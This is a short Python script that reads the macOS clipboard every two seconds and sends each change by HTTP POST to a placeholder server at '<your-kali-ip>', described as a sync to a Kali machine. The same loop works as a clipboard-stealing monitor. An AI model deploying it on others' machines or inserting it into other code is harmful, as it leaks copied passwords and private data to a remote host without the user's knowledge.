import os
import requests
import time

SERVER_URL = "http://<your-kali-ip>:5000/sync"
def get_clipboard():
    return os.popen("pbpaste").read()
def sync_clipboard():
    clipboard_data = get_clipboard()
    if clipboard_data:
        response = requests.post(SERVER_URL,data={"clipboard": clipboard_data})
        if response.status_code == 200:
            print("Clipboard successfully synced to Kali.")
        else:
            print("Error syncing clipboard.")
    else:
        print("Clipboard is empty, nothing to sync.")
def monitor_clipboard():
    previous_clipboard= ""
    while True:
        clipboard_data = get_clipboard()
        if clipboard_data != previous_clipboard:
            previous_clipboard = clipboard_data
            sync_clipboard()
        time.sleep(2)
if __name__ == "__main__":
    monitor_clipboard()
